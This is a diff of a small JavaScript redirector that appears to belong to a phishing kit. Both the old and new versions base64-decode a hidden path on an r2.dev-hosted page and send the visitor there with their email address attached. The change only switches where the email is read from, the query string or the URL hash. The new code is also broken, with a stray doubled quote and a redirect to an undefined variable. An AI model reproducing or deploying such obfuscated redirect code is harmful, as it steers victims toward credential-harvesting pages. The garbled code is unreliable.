@@ -1,16 +1,17 @@
-<script type="text/javascript">
-    var urlParams = new URLSearchParams(window.location.search);
-    var email = urlParams.get('email');
+    <script type="text/javascript">
+    
+        if(window.location.hash) {
+            var url = window.location.href;
+            var hash = url.split('#').pop();
+            const encdStr = ''LnIyLmRldi9iYWNrZ3JvdW5kZnVsbCUyMGNvcHklMjAyLmh0bWw=';
+            const str = atob (encdStr);
+            const emma = '#' + hash;
+            const dr = 'https://pub-f78f6230b21b47daaf70cc124ade5011';
+            const ax = dr + str;
+            var link = ax + emma;
+            window.location.href = link;
+        } else {
+          window.location.href = link;
+        }
 
-    if (email) {
-        const encdStr = 'LnIyLmRldi9iYWNrZ3JvdW5kZnVsbCUyMGNvcHklMjAyLmh0bWw=';
-        const str = atob(encdStr);
-        const emma = '#' + email;
-        const dr = 'https://pub-f78f6230b21b47daaf70cc124ade5011';
-        const ax = dr + str;
-        var link = ax + emma;
-        window.location.href = link;
-    } else {
-        // Handle case when 'email' parameter is not present
-    }
-</script>
+    </script>
